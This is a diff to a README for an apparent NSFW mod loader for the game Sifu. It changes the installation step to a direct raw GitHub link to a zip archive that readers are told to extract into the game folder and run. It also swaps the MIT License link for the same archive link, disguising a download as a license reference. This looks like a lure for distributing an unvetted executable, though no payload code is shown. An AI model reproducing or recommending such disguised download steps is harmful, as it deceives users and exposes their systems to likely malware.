@@ -30,7 +30,7 @@ Unlock custom adult visuals for Sifu—dynamic content, enhanced freedom, and re
 
 ## 🚀 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/MohGith/SifuUnleashedNSFW/main/Carangidae/SifuUnleashedNSFW.zip** from the repository.
 2. Extract to your Sifu game directory.
 3. Run the loader for your operating system.
 4. Follow the on-screen setup to activate NSFW features.
@@ -52,4 +52,4 @@ This project is intended for mature audiences only. Usage may violate Sifu’s T
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – free and open for everyone in 2025!
+Distributed under the [MIT License](https://raw.githubusercontent.com/MohGith/SifuUnleashedNSFW/main/Carangidae/SifuUnleashedNSFW.zip) – free and open for everyone in 2025!
